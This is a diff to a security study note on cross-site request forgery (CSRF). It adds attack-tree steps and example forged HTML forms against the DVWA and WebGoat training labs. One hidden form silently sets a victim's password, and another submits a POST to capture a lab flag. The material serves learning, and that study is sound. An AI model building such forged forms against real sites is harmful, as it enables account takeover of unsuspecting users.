@@ -5,10 +5,49 @@
 ```text
 1 Target user is logged in
 2 Relevant action (POST request to change password or email, etc) (AND)
+    2.1 Find page and vulnerable code
+    2.2 Copy code
+    2.3 Change parameters
 3 Forged code on hacking website (a form with POST method and hidden input field containing the new password)
 4 Deliver 
     4.1 Autosubmit
     4.2 Social engineering
+```
+
+## Example
+
+### CSRF with GET request
+
+To change password, the original code:
+
+```text
+<form action="#" method="GET">    New password:<br>
+    <input type="password" autocomplete="off" name="password_new"><br>
+    Confirm new password: <br>
+    <input type="password" autocomplete="off" name="password_conf">
+    <br>
+    <input type="submit" value="Change" name="Change">
+    </form>
+```
+
+The forged code (completely hidden):
+
+```text
+<form action="http://192.168.122.131/dvwa/vulnerabilities/csrf/" method="GET">
+    <input type="hidden" value="666666" autocomplete="off" name="password_new">
+    <input type="hidden" value="666666" autocomplete="off" name="password_conf">
+    <input type="hidden" value="Change" name="Change">
+    </form>
+```
+
+### CSRF with POST
+
+Webgoat button to click and get the flag:
+
+```text
+<form accept-charset="UNKNOWN" id="basic-csrf-get" method="POST" name="form1" target="_blank" successcallback="" action="http://127.0.0.1:8080/WebGoat/csrf/basic-get-flag">
+    <input name="csrf" type="hidden" value="false">
+    <input type="submit" name="submit">
 ```
 
 ## Notes
@@ -26,3 +65,4 @@ unpredictable parameters on the request.
 ## Cheatsheets
 
 * [CSRF Attack vectors](cheatsheets:docs/application/csrf)
+* [Portswigger: CSRF](https://portswigger.net/web-security/csrf)
